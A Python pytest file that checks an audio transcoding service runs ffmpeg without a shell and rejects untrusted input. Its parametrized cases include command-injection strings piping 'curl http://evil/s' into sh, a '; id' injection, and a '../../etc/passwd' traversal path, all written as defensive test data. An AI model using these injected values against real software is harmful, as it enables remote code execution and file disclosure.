import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.services import audio  # noqa: E402


def test_transcode_runs_without_a_shell(monkeypatch, tmp_path):
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append((cmd, kwargs))

    monkeypatch.setattr(audio.subprocess, "run", fake_run)
    source = str(tmp_path / "mixdown.wav")
    out_path = audio.transcode(source, "mp3", "192k", "mixdown")

    assert out_path == str(tmp_path / "mixdown.mp3")
    cmd, kwargs = calls[0]
    assert isinstance(cmd, list)
    assert kwargs["shell"] is False


@pytest.mark.parametrize(
    "target_format,bitrate,output_name",
    [
        ("mp3; curl http://evil/s | sh", "192k", "mixdown"),
        ("wav", "192k; id", "mixdown"),
        ("wav", "192k", "x; curl http://evil/s | sh"),
        ("wav", "192k", "../../etc/passwd"),
        ("aiff", "192k", "mixdown"),
        ("wav", "fast", "mixdown"),
    ],
)
def test_transcode_rejects_untrusted_values(monkeypatch, target_format, bitrate, output_name):
    def fail_run(cmd, **kwargs):
        raise AssertionError("ffmpeg must not run for invalid input")

    monkeypatch.setattr(audio.subprocess, "run", fail_run)
    with pytest.raises(audio.InvalidTranscodeRequest):
        audio.transcode("/tmp/mixdown.wav", target_format, bitrate, output_name)
